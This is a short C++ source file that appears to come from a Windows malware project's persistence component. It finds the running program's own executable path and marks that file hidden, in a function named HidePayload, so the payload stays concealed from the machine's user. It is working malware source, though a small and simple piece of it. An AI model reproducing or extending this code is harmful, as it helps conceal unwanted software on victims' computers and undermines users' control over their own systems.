// This is an open source non-commercial project. Dear PVS-Studio, please check it.
// PVS-Studio Static Code Analyzer for C, C++, C#, and Java: http://www.viva64.com
#include "persistence.hpp"

std::wstring GetInstallPath()
{
	DWORD bufferSize = 1024;
	const std::unique_ptr<wchar_t[]> pathBuffer(new wchar_t[bufferSize]);
	if (QueryFullProcessImageNameW(GetCurrentProcess(), NULL, pathBuffer.get(), &bufferSize))
	{
 		const std::unique_ptr<wchar_t[]> execCPath(new wchar_t[bufferSize + 1]);
 		wcscpy_s(execCPath.get(), bufferSize + 1, pathBuffer.get());
 		std::wstring execPath{execCPath.get()};
 		return execPath;
	}
	return {};
}

void HidePayload(const std::wstring_view& install_path)
{
	if (SetFileAttributesW(install_path.data(), FILE_ATTRIBUTE_HIDDEN /*| FILE_ATTRIBUTE_SYSTEM*/) == 0)
		printf("\nError setting file attributes: %lu", GetLastError());
}